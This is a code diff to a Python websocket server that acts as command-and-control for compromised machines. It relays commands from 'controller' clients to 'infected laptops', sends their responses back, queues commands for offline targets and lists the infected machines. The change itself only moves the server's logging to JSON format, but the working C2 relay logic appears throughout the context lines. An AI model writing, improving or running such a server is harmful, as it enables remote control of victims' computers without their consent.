@@ -5,9 +5,16 @@ import uuid
 import logging
 import socket
 from datetime import datetime, timedelta
+from pythonjsonlogger import jsonlogger
 
 # Configure logging
-logging.basicConfig(level=logging.DEBUG, format="%(asctime)s [%(levelname)s] %(message)s")
+log_handler = logging.StreamHandler()
+formatter = jsonlogger.JsonFormatter()
+log_handler.setFormatter(formatter)
+
+logger = logging.getLogger()
+logger.setLevel(logging.DEBUG)
+logger.addHandler(log_handler)
 
 # Store connected computers and messages
 clients = {}
@@ -21,7 +28,7 @@ def cleanup_old_messages():
     global messages
     cutoff = datetime.now() - MESSAGE_RETENTION_PERIOD
     messages[:] = [msg for msg in messages if msg['command_time'] > cutoff]
-    logging.info(f"Cleaned up messages. Remaining messages: {len(messages)}")
+    logger.info("Cleaned up messages.", extra={"remaining_messages": len(messages)})
 
 # Assign a unique ID to each new connection
 async def register_client(websocket, role, client_id, data=None):
@@ -32,7 +39,7 @@ async def register_client(websocket, role, client_id, data=None):
         'data': data,
         'messages': []
     }
-    logging.info(f"Registered new {role}: {client_id} with data: {data}")
+    logger.info("Registered new client.", extra={"role": role, "client_id": client_id, "data": data})
 
 # Relay messages between control and infected laptops
 async def relay_messages(websocket, client_id, role):
@@ -40,7 +47,7 @@ async def relay_messages(websocket, client_id, role):
         try:
             message = await websocket.recv()
             data = json.loads(message)
-            logging.info(f"Received message from {client_id} ({role}): {data}")
+            logger.info("Received message from client.", extra={"client_id": client_id, "role": role, "data": data})
 
             cleanup_old_messages()  # Clean up old messages before processing new ones
 
@@ -49,7 +56,7 @@ async def relay_messages(websocket, client_id, role):
                 command = data['command']
                 command_type = data['command_type']
 
-                logging.info(f"Processing command for target {target_id}: {command}")
+                logger.info("Processing command.", extra={"target_id": target_id, "command": command})
 
                 if target_id in clients and clients[target_id]['role'] == 'infected':
                     target_ws = clients[target_id]['websocket']
@@ -69,29 +76,29 @@ async def relay_messages(websocket, client_id, role):
 
                     await target_ws.send(json.dumps(new_message))
                     messages.append(new_message)
-                    logging.info(f"Command sent to target {target_id}: {new_message}")
+                    logger.info("Command sent to target.", extra={"target_id": target_id, "message": new_message})
                 else:
                     clients[client_id]['messages'].append(data)
-                    logging.info(f"Client {target_id} is not connected. Command queued.")
+                    logger.info("Client not connected, command queued.", extra={"client_id": target_id})
 
             elif data.get("type") == "response" and role == "infected":
                 command_id = data['command_id']
                 response = data['response']
-                logging.info(f"Processing response for command ID {command_id}: {response}")
+                logger.info("Processing response for command ID.", extra={"command_id": command_id, "response": response})
 
                 # Find the original command and update it with the response
                 for msg in messages:
                     if msg['id'] == command_id:
                         msg['response'] = response
                         msg['response_time'] = datetime.now()
-                        logging.info(f"Updated message with response: {msg}")
+                        logger.info("Updated message with response.", extra={"msg": msg})
                         break
 
                 origin_id = msg['origin']
                 if origin_id in clients:
                     origin_ws = clients[origin_id]['websocket']
                     await origin_ws.send(json.dumps(msg))
-                    logging.info(f"Response relayed to origin {origin_id}: {msg}")
+                    logger.info("Response relayed to origin.", extra={"origin_id": origin_id, "msg": msg})
 
             elif data.get("type") == "request_client_list" and role == "controller":
                 clients_list = {client_id: {
@@ -103,13 +110,12 @@ async def relay_messages(websocket, client_id, role):
 
                 await websocket.send(json.dumps({'type': 'infected_list', 'infected_laptops': clients_list}))
 
-
         except websockets.ConnectionClosed:
-            logging.info(f"Client {client_id} ({role}) disconnected.")
+            logger.info("Client disconnected.", extra={"client_id": client_id, "role": role})
             del clients[client_id]
             break
         except Exception as e:
-            logging.error(f"Exception occurred: {e}", exc_info=True)
+            logger.error("Exception occurred.", exc_info=True, extra={"client_id": client_id})
 
 # Handle new connections
 async def connection_handler(websocket, path):
@@ -126,11 +132,11 @@ async def connection_handler(websocket, path):
         await register_client(websocket, role, client_id, data)
         await relay_messages(websocket, client_id, role)
     except websockets.ConnectionClosed:
-        logging.info(f"Connection closed for client: {client_id if client_id else 'unknown client'}")
+        logger.info("Connection closed for client.", extra={"client_id": client_id if client_id else 'unknown'})
         if client_id in clients:
             del clients[client_id]
     except Exception as e:
-        logging.error(f"Exception occurred in connection handler: {e}", exc_info=True)
+        logger.error("Exception occurred in connection handler.", exc_info=True)
 
 # Function to get the local IP address of the server
 def get_local_ip():
@@ -149,8 +155,7 @@ async def main():
     ip_address = get_local_ip()
     port = 6857
 
-    logging.info(f"Server listening on 0.0.0.0:{port}")
-    logging.info(f"Server at {ip_address}:{port}")
+    logger.info("Server listening.", extra={"ip": ip_address, "port": port})
 
     async with websockets.serve(connection_handler, "0.0.0.0", port):
         await asyncio.Future()  # Run forever
